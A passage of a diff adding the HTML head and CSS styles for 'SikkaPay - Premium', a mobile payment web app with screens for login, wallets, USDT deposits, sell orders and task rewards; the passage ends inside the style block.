@@ -1,0 +1,1772 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>SikkaPay - Premium</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+<style>
+    /* ================= PREMIUM GLOBAL STYLES ================= */
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; -webkit-tap-highlight-color: transparent; }
+    body { background-color: #e0e0e0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+
+    .phone-container {
+        width: 100%; max-width: 412px; height: 100vh;
+        background-color: #F4F6F9; position: relative; display: flex; flex-direction: column;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.2); overflow: hidden;
+    }
+    ::-webkit-scrollbar { width: 0; }
+
+    /* Screen Management */
+    .screen { display: none; flex-direction: column; position: absolute; inset: 0; overflow-y: auto; background-color: #F4F6F9; padding-bottom: 85px; }
+    .screen.active { display: flex; }
+    
+    /* Common Header */
+    .header { display: flex; justify-content: center; align-items: center; padding: 20px; position: sticky; top: 0; background: rgba(244, 246, 249, 0.95); backdrop-filter: blur(10px); z-index: 100; }
+    .back-btn { position: absolute; left: 20px; font-size: 22px; color: #0D8A5F; cursor: pointer; transition: 0.2s; }
+    .back-btn:active { transform: scale(0.9); }
+    .header h2 { font-size: 22px; font-weight: 700; color: #0D8A5F; letter-spacing: -0.5px; }
+
+    /* ================= LOGIN / REGISTER ================= */
+    #screen-login, #screen-register { padding-bottom: 30px; }
+    .login-container { padding: 30px; display: flex; flex-direction: column; justify-content: center; min-height: 100vh; background: #F4F6F9; }
+    .logo-box { text-align: center; margin-bottom: 30px; }
+    .logo-box img { width: 110px; height: 110px; object-fit: contain; border-radius: 24px; background: #fff; padding: 10px; box-shadow: 0 8px 25px rgba(13,138,95,0.15); margin-bottom: 15px; }
+    .logo-box h1 { color: #0D8A5F; font-size: 26px; font-weight: 900; letter-spacing: 1px; }
+    
+    .input-group { position: relative; margin-bottom: 15px; }
+    .input-group i { position: absolute; left: 20px; top: 50%; transform: translateY(-50%); color: #118c5e; font-size: 18px; }
+    .input-group input { width: 100%; padding: 16px 20px 16px 55px; border: 1px solid #E2E8F0; border-radius: 16px; font-size: 16px; outline: none; background: white; box-shadow: inset 0 2px 4px rgba(0,0,0,0.02); transition: 0.3s; }
+    .input-group input:focus { border-color: #0D8A5F; box-shadow: 0 0 0 3px rgba(13,138,95,0.1); }
+    
+    .login-opt { display: flex; justify-content: space-between; font-size: 14px; margin-bottom: 15px; padding: 0 10px; color: #0D8A5F; }
+    .login-opt a { cursor: pointer; text-decoration: underline; font-weight: 500; }
+    
+    .check-row { display: flex; align-items: center; font-size: 14px; color: #555; margin-bottom: 25px; padding: 0 10px; }
+    .check-row input { width: 18px; height: 18px; accent-color: #0D8A5F; margin-right: 10px; }
+    
+    .btn-main { width: 100%; background: linear-gradient(135deg, #0F8F5F, #0b6e4c); color: white; border: none; padding: 16px; border-radius: 16px; font-size: 18px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 15px rgba(13,138,95,0.3); transition: 0.3s; }
+    .btn-main:active { transform: translateY(2px); box-shadow: 0 2px 10px rgba(13,138,95,0.2); }
+    
+    .reg-header { display: flex; align-items: center; justify-content: center; position: relative; margin-bottom: 30px; margin-top: 10px; }
+    .reg-header i { position: absolute; left: 0; font-size: 22px; color: #0D8A5F; cursor: pointer; }
+    .reg-header h2 { font-size: 22px; font-weight: 700; color: #0D8A5F; }
+    
+    .otp-btn { background: #81C7A6; border: none; color: white; padding: 10px 18px; border-radius: 12px; font-weight: 700; font-size: 13px; cursor: pointer; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+
+    /* ================= 1. DASHBOARD ================= */
+    .top-user { display: flex; justify-content: space-between; align-items: center; padding: 15px 16px; }
+    .user-info { display: flex; align-items: center; gap: 10px; }
+    .avatar { width: 45px; height: 45px; background: #E0F2FE; border-radius: 50%; display: flex; justify-content: center; align-items: center; color: #0369A1; font-size: 22px; }
+    .user-name { font-size: 20px; font-weight: 900; color: #111; }
+    .user-id { font-size: 14px; color: #666; }
+    .bell-icon { font-size: 24px; color: #333; cursor: pointer; }
+    
+    .banner-container { width: 100%; height: 130px; border-radius: 20px; overflow: hidden; margin-bottom: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); position: relative; cursor: pointer; }
+    .banner-container img { width: 100%; height: 100%; object-fit: cover; }
+    .banner-placeholder { width: 100%; height: 100%; background: linear-gradient(135deg, #0D0F3B 0%, #4633A6 100%); display: flex; justify-content: center; align-items: center; color: rgba(255,255,255,0.5); font-size: 14px; }
+
+    .home-balance-card { background: linear-gradient(135deg, #0F8F5F, #0b6e4c); border-radius: 20px; padding: 20px; color: white; position: relative; overflow: hidden; height: 150px; margin-bottom: 20px; box-shadow: 0 6px 20px rgba(15,143,95,0.25); }
+    .home-balance-card .shape-yellow { position: absolute; width: 140px; height: 140px; background: #F4C430; border-radius: 50%; top: -40px; right: -20px; z-index: 1; opacity: 0.9; }
+    .home-balance-card .shape-blue { position: absolute; width: 150px; height: 150px; background: #4285F4; border-radius: 50%; top: 30px; right: -50px; z-index: 2; opacity: 0.9; }
+    .home-balance-content { position: relative; z-index: 3; display: flex; flex-direction: column; height: 100%; }
+    .bal-title { font-size: 15px; opacity: 0.9; }
+    .bal-amount { font-size: 34px; font-weight: 900; margin-top: 5px; }
+    .btn-detail { background: white; color: #0F8F5F; padding: 8px 24px; border-radius: 25px; font-weight: 900; font-size: 14px; border: none; align-self: flex-end; margin-top: auto; box-shadow: 0 2px 8px rgba(0,0,0,0.1); cursor: pointer; }
+    
+    .action-grid { display: flex; justify-content: space-between; margin-bottom: 20px; }
+    .action-box { display: flex; flex-direction: column; align-items: center; gap: 8px; cursor: pointer; width: 23%; transition: 0.2s; }
+    .action-box:active { transform: scale(0.95); }
+    .action-icon { width: 65px; height: 65px; background: white; border-radius: 18px; display: flex; justify-content: center; align-items: center; font-size: 28px; color: #333; box-shadow: 0 4px 12px rgba(0,0,0,0.05); border: 1px solid #F0F0F0; overflow: hidden; padding: 10px; }
+    .action-icon img { width: 100%; height: 100%; object-fit: contain; }
+    .action-box span { font-size: 13px; font-weight: 700; color: #333; }
+    
+    .newcomer-card { background: linear-gradient(135deg, #0AB5E8 0%, #0E7CD3 100%); border-radius: 20px; padding: 20px; color: white; position: relative; overflow: hidden; height: 140px; cursor: pointer; box-shadow: 0 6px 20px rgba(10,181,232,0.2); transition: 0.3s; }
+    .newcomer-card:active { transform: scale(0.98); }
+    .newcomer-card h5 { font-size: 12px; font-weight: 900; letter-spacing: 1px; }
+    .newcomer-card h3 { font-size: 26px; font-weight: 900; margin: 5px 0; }
+    .newcomer-card p { font-size: 13px; opacity: 0.9; }
+
+    /* ================= 2. PAYMENT SCREEN ================= */
+    #screen-payment .cashback-card { background: linear-gradient(135deg, #0F8F5F, #0b6e4c); border-radius: 24px; padding: 20px; position: relative; overflow: hidden; height: 210px; display: flex; flex-direction: column; justify-content: space-between; margin: 0 15px 20px; box-shadow: 0 8px 25px rgba(15,143,95,0.2); }
+    #screen-payment .bg-circle-yellow { position: absolute; width: 180px; height: 180px; background: #F3C634; border-radius: 50%; top: -60px; right: 80px; z-index: 1; opacity: 0.9; }
+    #screen-payment .bg-circle-blue { position: absolute; width: 220px; height: 220px; background: #4285F4; border-radius: 50%; bottom: -60px; right: -40px; z-index: 2; opacity: 0.9; }
+    #screen-payment .chart-bars { position: absolute; right: 50px; top: 50px; display: flex; align-items: flex-end; gap: 8px; z-index: 1; }
+    #screen-payment .chart-bars div { width: 14px; border-radius: 2px; }
+    #screen-payment .cb-top-text { position: relative; z-index: 4; color: white; }
+    #screen-payment .cb-top-text p { font-size: 18px; font-weight: 500; margin-bottom: 2px; }
+    #screen-payment .cb-top-text h1 { font-size: 44px; font-weight: 900; line-height: 1; }
+    #screen-payment .cb-bottom-boxes { position: relative; z-index: 4; display: flex; gap: 10px; height: 100px; margin-top: auto; }
+    #screen-payment .glass-box { background: rgba(255,255,255,0.15); border: 1px solid rgba(255,255,255,0.3); border-radius: 12px; padding: 10px 12px; display: flex; flex-direction: column; justify-content: space-between; backdrop-filter: blur(5px); }
+    #screen-payment .glass-box p { font-size: 13px; color: rgba(255,255,255,0.9); font-weight: 500;}
+    #screen-payment .glass-box h4 { font-size: 20px; font-weight: 700; color: white; text-align: center; font-family: monospace;}
+    #screen-payment .box-balance { flex: 1; }
+    #screen-payment .box-right-stack { flex: 1; display: flex; flex-direction: column; justify-content: space-between; gap: 10px; }
+    #screen-payment .box-small { flex: 1; padding: 8px 12px; }
+    #screen-payment .warning-text { text-align: center; color: #0D8A5F; font-size: 13px; margin-bottom: 20px; padding: 0 20px; line-height: 1.5; font-weight: 500; }
+    #screen-payment .chips { display: flex; gap: 10px; overflow-x: auto; margin-bottom: 20px; padding: 0 15px; }
+    #screen-payment .chips::-webkit-scrollbar { display: none; }
+    #screen-payment .chip { background: #EAEAEA; color: #555; padding: 10px 20px; border-radius: 25px; font-size: 14px; white-space: nowrap; cursor: pointer; transition: 0.3s; font-weight: 500; }
+    #screen-payment .chip.active { background: #0D8A5F; color: white; font-weight: 700; box-shadow: 0 4px 10px rgba(13,138,95,0.2); }
+    #screen-payment .order-list { padding: 0 15px; display: flex; flex-direction: column; gap: 15px; }
+    #screen-payment .order-card { background: white; border-radius: 16px; padding: 18px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 15px rgba(0,0,0,0.03); transition: 0.3s; border: 1px solid #F0F0F0; }
+    #screen-payment .oc-left h3 { font-size: 16px; font-weight: 700; color: #111; margin-bottom: 5px; }
+    #screen-payment .oc-left p { font-size: 13px; color: #666; font-weight: 500; }
+    #screen-payment .oc-left span { color: #0D8A5F; font-weight: 700; }
+    #screen-payment .oc-right { display: flex; flex-direction: column; align-items: flex-end; gap: 10px; }
+    #screen-payment .btn-receive { background: #0D8A5F; color: white; border: none; padding: 10px 24px; border-radius: 20px; font-size: 14px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 10px rgba(13,138,95,0.2); transition: 0.2s; }
+    #screen-payment .btn-receive:active { transform: scale(0.95); }
+    #screen-payment .final-amt { font-size: 14px; font-weight: 900; color: #111; }
+    #screen-payment .final-amt span { color: #0D8A5F; }
+
+    /* ================= 3. TOOLS SCREEN ================= */
+    #screen-tools .tool-list { padding: 0 15px; }
+    #screen-tools .btn-add-top { width: 100%; background: linear-gradient(135deg, #0F8F5F, #0b6e4c); color: white; border: none; padding: 16px; border-radius: 16px; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 20px; box-shadow: 0 4px 15px rgba(13,138,95,0.3); transition: 0.2s; }
+    #screen-tools .btn-add-top:active { transform: scale(0.98); }
+    #screen-tools .no-wallet-text { text-align: center; color: #888; font-size: 15px; margin-top: 30px; }
+    #screen-tools .wallet-card { background: linear-gradient(135deg, #0F8F5F, #0b6e4c); border-radius: 20px; padding: 20px; position: relative; overflow: hidden; margin-bottom: 15px; box-shadow: 0 6px 20px rgba(15,143,95,0.2); }
+    #screen-tools .wallet-card .shape-y { position: absolute; width: 100px; height: 100px; background: #F4C430; border-radius: 50%; top: -20px; right: 40px; z-index: 1; }
+    #screen-tools .wallet-card .shape-b { position: absolute; width: 120px; height: 120px; background: #4285F4; border-radius: 50%; bottom: -20px; right: -30px; z-index: 2; }
+    #screen-tools .wc-content { position: relative; z-index: 3; color: white; }
+    #screen-tools .wc-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 5px; }
+    #screen-tools .wc-title { font-size: 20px; font-weight: 700; }
+    #screen-tools .wc-upi { font-size: 14px; opacity: 0.9; margin-bottom: 15px; }
+    #screen-tools .wc-range { border: 1px solid rgba(255,255,255,0.3); background: rgba(255,255,255,0.1); padding: 8px 12px; border-radius: 10px; font-size: 13px; display: inline-block; backdrop-filter: blur(5px);}
+    #screen-tools .status-pill { padding: 6px 16px; border-radius: 15px; font-size: 12px; font-weight: 700; border: none; cursor: pointer; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+    #screen-tools .status-pill.enabled { background: #0b6e4c; color: white; }
+    #screen-tools .status-pill.disabled { background: #F1C40F; color: #111; }
+
+    /* ================= 4. STATISTICS SCREEN ================= */
+    #screen-statistics .main-card { background: white; border-radius: 20px; padding: 20px; margin: 0 15px 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); border: 1px solid #F0F0F0; }
+    #screen-statistics .section-title { display: flex; align-items: center; gap: 8px; font-size: 18px; font-weight: 700; color: #111; margin-bottom: 15px; }
+    #screen-statistics .section-title::before { content: ''; width: 4px; height: 20px; background: #0D8A5F; border-radius: 2px; display: block; }
+    #screen-statistics .section-title span { font-size: 13px; color: #888; font-weight: 400; margin-left: 5px; }
+    #screen-statistics .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 25px; }
+    #screen-statistics .stat-box { background: #F8F9FA; border-radius: 16px; padding: 15px; display: flex; flex-direction: column; gap: 10px; border: 1px solid #F0F0F0; }
+    #screen-statistics .stat-top { display: flex; align-items: center; gap: 10px; }
+    #screen-statistics .stat-icon { width: 32px; height: 32px; border-radius: 10px; display: flex; justify-content: center; align-items: center; color: white; font-size: 16px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+    #screen-statistics .icon-blue { background: #5C8EE6; } #screen-statistics .icon-yellow { background: #F4C430; color: #111;} #screen-statistics .icon-green { background: #12B886; } #screen-statistics .icon-red { background: #FF6B6B; }
+    #screen-statistics .stat-label { font-size: 14px; color: #666; font-weight: 500; }
+    #screen-statistics .stat-val { font-size: 18px; font-weight: 900; color: #111; text-align: center; }
+    #screen-statistics .exchange-rate { background: #E8F5E9; color: #0D8A5F; border-radius: 12px; padding: 14px 16px; display: flex; justify-content: space-between; font-weight: 500; font-size: 14px; margin-bottom: 15px; border: 1px solid #C8E6C9; }
+    #screen-statistics .payment-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    #screen-statistics .pay-box { background: #F8F9FA; border-radius: 16px; padding: 15px; display: flex; flex-direction: column; gap: 8px; border: 1px solid #F0F0F0; }
+    #screen-statistics .pay-title { font-size: 12px; color: #666; display: flex; align-items: center; gap: 5px; font-weight: 500; }
+    #screen-statistics .pay-title i { color: #F4C430; }
+    #screen-statistics .pay-val { font-size: 16px; font-weight: 900; color: #111; text-align: center; }
+    #screen-statistics .btn-action { width: calc(100% - 30px); margin: 0 15px 20px; background: linear-gradient(135deg, #F4C430, #E6B800); color: white; border: none; padding: 18px; border-radius: 20px; font-size: 20px; font-weight: 900; cursor: pointer; box-shadow: 0 6px 20px rgba(244,196,48,0.4); transition: 0.3s; }
+    #screen-statistics .btn-action:active { transform: scale(0.98); }
+    #screen-statistics .btn-action.start-selling { background: linear-gradient(135deg, #0F8F5F, #0b6e4c); box-shadow: 0 6px 20px rgba(13,138,95,0.4); }
+
+    /* ================= 5. MY ASSET SCREEN ================= */
+    #screen-my .asset-card { background: white; border-radius: 20px; padding: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); margin: 0 15px 15px; border: 1px solid #F0F0F0; }
+    #screen-my .asset-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    #screen-my .asset-box { background: #F4FCF8; border-radius: 16px; padding: 15px; display: flex; align-items: center; gap: 12px; cursor: pointer; border: 1px solid #E0F2E9; transition: 0.2s; }
+    #screen-my .asset-box:active { transform: scale(0.96); }
+    #screen-my .asset-icon { width: 42px; height: 42px; border-radius: 12px; display: flex; justify-content: center; align-items: center; font-size: 20px; }
+    #screen-my .icon-deposit { background: #E3F2FD; color: #1976D2; }
+    #screen-my .icon-withdraw { background: #F3E5F5; color: #8E24AA; }
+    #screen-my .icon-commission { background: #FFF8E1; color: #F57F17; }
+    #screen-my .asset-info p { font-size: 13px; color: #666; font-weight: 500; margin-bottom: 2px; }
+    #screen-my .asset-info h4 { font-size: 16px; font-weight: 900; color: #111; }
+    #screen-my .menu-card { background: white; border-radius: 20px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); margin: 0 15px 20px; border: 1px solid #F0F0F0; }
+    #screen-my .menu-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; }
+    #screen-my .menu-item { display: flex; flex-direction: column; align-items: center; gap: 8px; cursor: pointer; transition: 0.2s; }
+    #screen-my .menu-item:active { transform: scale(0.95); }
+    #screen-my .menu-icon { width: 60px; height: 60px; background: #F8F9FA; border-radius: 18px; display: flex; justify-content: center; align-items: center; font-size: 26px; color: #333; border: 1px solid #EAEAEA; }
+    #screen-my .menu-item span { font-size: 13px; font-weight: 700; color: #333; }
+    #screen-my .version-tag { text-align: right; font-size: 12px; color: #999; margin-top: 20px; }
+    #screen-my .btn-logout { width: calc(100% - 30px); margin: 0 15px; background: #FF4757; color: white; border: none; padding: 16px; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 15px rgba(255,71,87,0.3); transition: 0.2s; }
+    #screen-my .btn-logout:active { transform: scale(0.98); }
+
+    /* ================= 6. MESSAGE SCREEN ================= */
+    #screen-message .toggle-wrapper { padding: 0 20px; margin-top: 5px; margin-bottom: 20px; }
+    #screen-message .toggle-box { display: flex; background-color: #EAEFEC; border-radius: 16px; padding: 5px; position: relative; }
+    #screen-message .toggle-btn { flex: 1; text-align: center; padding: 12px 0; font-size: 15px; font-weight: 700; color: #0D8A5F; border-radius: 12px; cursor: pointer; transition: all 0.3s ease; z-index: 2; }
+    #screen-message .toggle-btn.active { background-color: #FFFFFF; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
+    
+    /* ================= 7. BUY ORDERS SCREEN ================= */
+    #screen-buy-orders .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.4); z-index: 10; display: none; backdrop-filter: blur(2px); }
+    #screen-buy-orders .filter-row { display: flex; gap: 12px; padding: 0 15px; margin-top: 5px; position: relative; z-index: 20; }
+    #screen-buy-orders .filter-btn { flex: 1; background-color: #FFFFFF; border-radius: 12px; padding: 14px 0; display: flex; justify-content: center; align-items: center; gap: 8px; font-size: 15px; font-weight: 600; color: #333; box-shadow: 0 2px 10px rgba(0,0,0,0.03); cursor: pointer; border: 1px solid #EAEAEA; }
+    #screen-buy-orders .filter-btn.active { color: #0D8A5F; border-color: #0D8A5F; }
+    #screen-buy-orders .filter-btn i { font-size: 12px; }
+    #screen-buy-orders .dropdown-container { position: absolute; top: 115px; left: 15px; right: 15px; z-index: 20; display: none; flex-direction: column; gap: 8px; }
+    #screen-buy-orders .dropdown-item { background-color: #FFFFFF; border-radius: 12px; padding: 16px; font-size: 16px; font-weight: 500; color: #111; display: flex; justify-content: space-between; align-items: center; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.08); border: 1px solid #f0f0f0; }
+    #screen-buy-orders .dropdown-item.selected { color: #0D8A5F; font-weight: 700; }
+    #screen-buy-orders .dropdown-item i.fa-check { color: #0D8A5F; font-size: 18px; display: none; }
+    #screen-buy-orders .dropdown-item.selected i.fa-check { display: block; }
+    #screen-buy-orders .empty-state { text-align: center; margin-top: 40px; color: #999; font-size: 15px; z-index: 1; position: relative; }
+
+    /* ================= 8. SCORE SCREEN ================= */
+    #screen-score .content-scroll { padding: 10px 15px; }
+    #screen-score .score-card { background-color: #FFFFFF; border-radius: 20px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); display: flex; flex-direction: column; border: 1px solid #F0F0F0; }
+    #screen-score .score-top { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 25px; }
+    #screen-score .score-left .title { font-size: 16px; color: #555; margin-bottom: 5px; font-weight: 500; }
+    #screen-score .score-left .amount { font-size: 38px; color: #0D8A5F; font-weight: 900; letter-spacing: -0.5px; }
+    #screen-score .score-right { display: flex; flex-direction: column; align-items: flex-end; }
+    #screen-score .score-right .change-text { font-size: 16px; color: #0D8A5F; margin-bottom: 10px; font-weight: 600; }
+    #screen-score .icons-container { display: flex; position: relative; }
+    #screen-score .icon-circle { width: 40px; height: 40px; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 20px; color: #000; border: 2px solid white; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+    #screen-score .icon-yellow { background-color: #F4E8C1; z-index: 2; }
+    #screen-score .icon-brown { background-color: #C49E73; margin-left: -15px; z-index: 1; }
+    #screen-score .action-toggle { display: flex; background-color: #E8F5E9; border-radius: 14px; padding: 5px; width: 100%; }
+    #screen-score .action-btn { flex: 1; text-align: center; padding: 14px 0; font-size: 18px; font-weight: 700; border-radius: 10px; cursor: pointer; transition: all 0.3s ease; color: #0D8A5F; }
+    #screen-score .action-btn.active { background-color: #FFFFFF; color: #0D8A5F; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
+
+    /* ================= 9. SELL ORDERS SCREEN ================= */
+    #screen-sell-orders .tabs-wrapper { background-color: #F4F6F9; padding: 15px 0; width: 100%; border-bottom: 1px solid #EAEAEA; }
+    #screen-sell-orders .tabs-scroll { display: flex; gap: 10px; overflow-x: auto; padding: 0 15px; scrollbar-width: none; }
+    #screen-sell-orders .tabs-scroll::-webkit-scrollbar { display: none; }
+    #screen-sell-orders .tab-btn { padding: 10px 20px; background-color: #FFFFFF; border: 1px solid #EAEAEA; border-radius: 12px; font-size: 14px; color: #555; font-weight: 600; white-space: nowrap; cursor: pointer; transition: all 0.2s ease; }
+    #screen-sell-orders .tab-btn.active { background-color: #E8F5E9; border-color: #A5CEBD; color: #0D8A5F; }
+    #screen-sell-orders .content-area { flex: 1; padding: 20px 15px; background-color: #F4F6F9; }
+    #screen-sell-orders .no-orders-card { background-color: #FFFFFF; border-radius: 16px; padding: 30px 0; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.03); border: 1px solid #F0F0F0; }
+    #screen-sell-orders .no-orders-card h3 { font-size: 18px; color: #333; font-weight: 700; }
+
+    /* ================= 10. DEPOSIT SCREEN ================= */
+    #screen-deposit .content-pad { padding: 0 15px 20px; }
+    #screen-deposit .instruction-box { background-color: #E8F5E9; border-radius: 16px; padding: 16px; margin-bottom: 20px; color: #333; font-size: 14px; line-height: 1.6; border: 1px solid #C8E6C9; }
+    #screen-deposit .instruction-box b { color: #0D8A5F; }
+    #screen-deposit .main-card { background-color: #FFFFFF; border-radius: 20px; padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); border: 1px solid #F0F0F0; }
+    #screen-deposit .calc-header { display: flex; justify-content: space-between; align-items: flex-end; margin-bottom: 15px; }
+    #screen-deposit .calc-title { font-size: 16px; font-weight: 700; color: #333; }
+    #screen-deposit .calc-ratio { font-size: 13px; color: #0D8A5F; font-weight: 600; }
+    #screen-deposit .input-row { display: flex; align-items: center; border: 1px solid #EAEAEA; border-radius: 12px; padding: 10px; margin-bottom: 15px; background: #F8F9FA; }
+    #screen-deposit .usdt-badge { background-color: #0D8A5F; color: white; padding: 8px 14px; border-radius: 8px; font-weight: 700; font-size: 14px; margin-right: 15px; }
+    #screen-deposit .input-row input { border: none; outline: none; font-size: 18px; width: 100%; background: transparent; font-weight: 600; color: #333; }
+    #screen-deposit .result-row { display: flex; gap: 12px; margin-bottom: 25px; }
+    #screen-deposit .result-box { flex: 1; border: 1px solid #EAEAEA; border-radius: 12px; padding: 12px; text-align: center; background: #F8F9FA; }
+    #screen-deposit .res-title { font-size: 13px; color: #666; margin-bottom: 5px; font-weight: 500; }
+    #screen-deposit .res-val { font-size: 16px; font-weight: 800; color: #0D8A5F; }
+    #screen-deposit .chain-title { font-size: 15px; font-weight: 700; color: #333; margin-bottom: 12px; }
+    #screen-deposit .chain-option { display: flex; align-items: center; justify-content: space-between; border: 1px solid #EAEAEA; border-radius: 16px; padding: 15px; margin-bottom: 12px; cursor: pointer; transition: 0.2s; }
+    #screen-deposit .chain-option.active { border: 2px solid #0D8A5F; background-color: #F4FCF8; }
+    #screen-deposit .chain-left { display: flex; align-items: center; gap: 15px; }
+    #screen-deposit .chain-icon { width: 40px; height: 40px; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 20px; color: white; position: relative; }
+    #screen-deposit .icon-tether { background-color: #26A17B; }
+    #screen-deposit .icon-tether::after { content: 'T'; font-weight: 900; font-family: sans-serif; }
+    #screen-deposit .icon-bsc { background-color: #F3BA2F; }
+    #screen-deposit .icon-bsc::after { content: 'B'; font-weight: 900; font-family: sans-serif; }
+    #screen-deposit .icon-tether-overlay { position: absolute; bottom: -2px; right: -2px; background: red; width: 14px; height: 14px; border-radius: 50%; border: 2px solid white; }
+    #screen-deposit .chain-text h4 { font-size: 16px; font-weight: 700; color: #111; }
+    #screen-deposit .chain-text p { font-size: 13px; color: #777; }
+    #screen-deposit .radio-btn { width: 22px; height: 22px; border: 2px solid #D4EAE0; border-radius: 50%; display: flex; justify-content: center; align-items: center; }
+    #screen-deposit .chain-option.active .radio-btn { border-color: #0D8A5F; }
+    #screen-deposit .chain-option.active .radio-btn::after { content: ''; width: 12px; height: 12px; background: #0D8A5F; border-radius: 50%; }
+    #screen-deposit .warning-text { color: #D35400; font-size: 13px; margin-bottom: 20px; line-height: 1.5; background: #FFF3E0; padding: 10px; border-radius: 8px; }
+    #screen-deposit .btn-deposit { width: 100%; background: linear-gradient(135deg, #0F8F5F, #0b6e4c); color: white; border: none; padding: 16px; border-radius: 16px; font-size: 18px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 15px rgba(13,138,95,0.3); }
+
+    /* ================= 11. DEPOSIT ORDER SCREEN ================= */
+    #screen-deposit-order .order-card { background-color: #FFFFFF; border-radius: 20px; margin: 0 15px 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); overflow: hidden; border: 1px solid #F0F0F0; }
+    #screen-deposit-order .order-header-bg { background: linear-gradient(135deg, #E8F5E9, #C8E6C9); padding: 25px 20px; text-align: center; }
+    #screen-deposit-order .order-header-bg h1 { font-size: 30px; color: #0D8A5F; font-weight: 900; }
+    #screen-deposit-order .order-details { padding: 20px; }
+    #screen-deposit-order .detail-row { margin-bottom: 15px; border-bottom: 1px solid #F0F0F0; padding-bottom: 15px; }
+    #screen-deposit-order .detail-row:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
+    #screen-deposit-order .detail-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; }
+    #screen-deposit-order .detail-label { font-size: 15px; color: #666; font-weight: 500; }
+    #screen-deposit-order .copy-icon { color: #0D8A5F; font-size: 18px; cursor: pointer; }
+    #screen-deposit-order .detail-val { font-size: 15px; color: #111; font-weight: 600; word-break: break-all; }
+    #screen-deposit-order .type-badge { background-color: #0D8A5F; color: white; padding: 6px 12px; border-radius: 15px; font-size: 13px; font-weight: 700; display: inline-flex; align-items: center; gap: 5px; }
+    #screen-deposit-order .type-badge .icon-tether-mini { width: 18px; height: 18px; background: white; color: #0D8A5F; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 11px; font-weight: bold; }
+
+    /* ================= 12. TASK REWARDS SCREEN ================= */
+    #screen-task-rewards .subtitle { text-align: center; font-size: 15px; color: #666; margin-bottom: 20px; font-weight: 500; }
+    #screen-task-rewards .tabs-container { padding: 0 15px; margin-bottom: 20px; }
+    #screen-task-rewards .tabs-bg { display: flex; background-color: #EAEFEC; border-radius: 16px; padding: 5px; position: relative; }
+    #screen-task-rewards .tab-btn { flex: 1; text-align: center; padding: 12px 0; font-size: 14px; font-weight: 700; color: #0D8A5F; border-radius: 12px; cursor: pointer; transition: all 0.3s ease; z-index: 2; }
+    #screen-task-rewards .tab-btn.active { background-color: #FFFFFF; color: #0D8A5F; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
+    #screen-task-rewards .content-scroll { flex: 1; overflow-y: auto; padding: 0 15px 20px; display: none; }
+    #screen-task-rewards .content-scroll.active { display: block; }
+    #screen-task-rewards .task-card { background: #FFFFFF; border-radius: 16px; padding: 18px; margin-bottom: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); border: 1px solid #F0F0F0; }
+    #screen-task-rewards .card-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
+    #screen-task-rewards .badge-text { font-size: 11px; font-weight: 800; color: #8CC6A7; letter-spacing: 0.5px; display: flex; align-items: center; gap: 4px; }
+    #screen-task-rewards .badge-text::before { content: '•'; font-size: 14px; color: #8CC6A7; }
+    #screen-task-rewards .progress-section { display: flex; align-items: center; gap: 10px; flex: 1; justify-content: flex-end; }
+    #screen-task-rewards .progress-track { width: 100px; height: 8px; background: #F0F0F0; border-radius: 4px; overflow: hidden; }
+    #screen-task-rewards .progress-fill { height: 100%; background: #0D8A5F; border-radius: 4px; }
+    #screen-task-rewards .progress-text { font-size: 12px; color: #666; white-space: nowrap; font-weight: 600; }
+    #screen-task-rewards .card-title { font-size: 16px; font-weight: 800; color: #111; margin-bottom: 8px; line-height: 1.3; }
+    #screen-task-rewards .card-desc { font-size: 13px; color: #666; line-height: 1.5; margin-bottom: 15px; }
+    #screen-task-rewards .card-bottom { display: flex; justify-content: space-between; align-items: center; }
+    #screen-task-rewards .points { display: flex; align-items: center; gap: 8px; }
+    #screen-task-rewards .star-icon { width: 26px; height: 26px; background: #111; border-radius: 50%; display: flex; justify-content: center; align-items: center; color: #0D8A5F; font-size: 13px; }
+    #screen-task-rewards .points-val { font-size: 16px; font-weight: 800; color: #111; }
